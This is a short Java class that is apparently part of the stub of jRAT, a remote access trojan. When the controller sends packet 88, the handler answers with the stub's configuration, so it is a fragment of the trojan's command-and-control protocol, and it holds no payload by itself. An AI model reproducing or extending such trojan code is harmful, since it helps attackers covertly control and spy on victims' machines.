package su.jrat.stub.packets.incoming;

import su.jrat.stub.Configuration;
import su.jrat.stub.Connection;
import su.jrat.stub.packets.outgoing.Packet66Config;

public class Packet88StubConfig extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet66Config(Configuration.getConfig()));
	}

}
